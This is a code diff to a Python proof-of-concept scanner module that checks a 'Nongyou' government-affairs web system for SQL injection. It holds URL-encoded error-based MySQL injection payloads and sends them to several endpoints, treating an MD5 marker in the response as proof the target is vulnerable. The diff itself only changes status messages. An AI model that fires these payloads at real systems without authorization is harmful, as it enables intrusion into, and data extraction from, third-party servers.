@@ -29,15 +29,19 @@ class nongyou_multi_sqli_BaseVerify:
             '/WebDefault3.aspx?CountryName=test&level=0',
             '/ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1%27AnD%20%28SeLeCt%206765%20FrOM%28SeLeCT%20CoUnT%28%2a%29%2CCOnCaT%28Md5%281234%29%2CFLooR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFoRMaTION_ScHeMA.CHaRAcTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27QXgv%27%3D%27QXgv']
         try:
+            noexist = True
             for turl in urls:
                 payload = "%27%20AnD%20%28SeLeCt%201%20FrOm%28SeLeCt%20CoUnT%28%2a%29%2CCoNcAt%28Md5%281234%29%2CFlOoR%28RaNd%280%29%2a2%29%29x%20FrOm%20InFOrMATiON_ScHeMA.CHaRaCTER_SeTS%20GrOuP%20By%20x%29a%29%20AnD%27svkA%27%3D%27svkA%26CountryName%3D1"
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在农友政务系统多处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在nongyou_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
